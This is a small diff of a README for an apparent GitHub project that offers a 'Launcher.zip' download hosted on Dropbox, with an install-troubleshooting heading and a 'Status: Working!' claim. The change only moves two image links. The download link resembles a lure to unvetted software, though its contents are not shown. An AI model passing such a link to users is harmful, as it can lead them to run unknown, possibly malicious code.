@@ -4,10 +4,6 @@
 
 # 📁Software: [HERE](https://dl.dropboxusercontent.com/scl/fi/xnz4fm9l50zx67d9tl21u/Launcher.zip?rlkey=nsye76y375ig7d9geraku6x72&dl=0)
 
-![2](https://github.com/Al-Karammarriage/NB_SH/assets/136559579/11c7f6a9-c403-4ce1-bd24-337aea7f947f)
-
-![3](https://github.com/Al-Karammarriage/NB_SH/assets/136559579/37581a50-393a-4271-bdf9-93ee4953de7f)
-
 # 📌Information:
 
 🔥If you can’t install software, you need to:
@@ -22,6 +18,9 @@
 
 ***Status: Working! ✅***
 
+![2](https://github.com/Al-Karammarriage/NB_SH/assets/136559579/11c7f6a9-c403-4ce1-bd24-337aea7f947f)
+
+![3](https://github.com/Al-Karammarriage/NB_SH/assets/136559579/37581a50-393a-4271-bdf9-93ee4953de7f)
 
 # ⚙️Functions
 
